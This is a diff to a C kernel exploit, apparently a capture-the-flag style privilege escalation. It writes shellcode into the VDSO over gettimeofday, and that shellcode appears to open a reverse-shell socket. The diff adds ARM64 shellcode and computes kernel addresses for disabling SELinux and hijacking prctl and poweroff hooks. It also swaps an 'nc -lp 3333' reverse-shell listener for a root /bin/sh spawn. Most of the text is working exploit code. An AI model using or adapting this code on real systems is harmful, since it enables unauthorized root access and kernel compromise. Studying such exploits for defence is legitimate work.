@@ -116,6 +116,7 @@ int main()
 	struct init_args i_args;
 	struct realloc_args rello_args;
 	char shellcode[]="\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";
+	//char shellcode[]="\xfd\x7b\xbf\xa9\xe1\x53\x9a\x92\xa1\x01\xa0\xf2\x00\x00\x80\x52\xfd\x03\x00\x91\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xe1\xff\x9a\x92\xa1\x01\xa0\xf2\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xfd\x7b\xc1\xa8\xc0\x03\x5f\xd6";
 
 	setvbuf(stdout, 0LL, 2, 0LL);
 	char *buf=malloc(0x1000);
@@ -150,11 +151,27 @@ int main()
 	// shellcode写到VDSO,覆盖gettimeofday
 	write_mem(fd,result+0xc80, shellcode,strlen(shellcode));    //  $ objdump xxx -T  查看gettimeofday代码偏移
 
-	if (check_vdso_shellcode(shellcode)!=0)
+
+	    // 根据VDSO地址得到 kernel_base 
+    kernel_base=result & 0xffffffffff000000;
+    selinux_disable_addr+=kernel_base;
+    prctl_hook+=kernel_base;
+    order_cmd+=kernel_base;
+    poweroff_work_addr+=kernel_base;
+    printf("[+] found kernel_base: %p\n",kernel_base);
+    printf("[+] found prctl_hook: %p\n",prctl_hook);
+    printf("[+] found order_cmd: %p\n",order_cmd);
+    printf("[+] found selinux_disable_addr: %p\n",selinux_disable_addr);
+    printf("[+] found poweroff_work_addr: %p\n",poweroff_work_addr);
+	if (getuid()==0)
 	{
-		printf("[+] Shellcode is written into vdso, waiting for reverse shell :\n");
-		system("nc -lp 3333");
+		printf("[+] Congratulations! You get root shell !!! [+]\n");
+		system("/bin/sh");
 	}
+	//if (check_vdso_shellcode(shellcode)!=0)
+	//{
+
+	//}
 	else
 	{
 		puts("[-] There are something wrong!\n");
